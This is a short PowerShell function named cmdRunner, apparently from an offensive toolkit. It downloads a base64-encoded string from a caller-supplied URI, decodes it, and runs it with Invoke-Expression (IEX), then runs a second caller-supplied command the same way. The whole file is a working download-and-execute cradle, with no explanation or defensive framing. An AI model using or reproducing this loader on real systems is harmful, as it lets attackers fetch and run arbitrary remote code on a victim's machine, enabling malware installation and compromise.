function cmdRunner {
    Param(
    [parameter(Mandatory=$true)]
    [String]
    $Uri,
    [Parameter(Mandatory=$true)]
    [String]
    $Command
    )

    $data = (New-Object Net.WebClient).DownloadString($Uri)
    $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($data))
    IEX($decoded)
    IEX($Command)
}
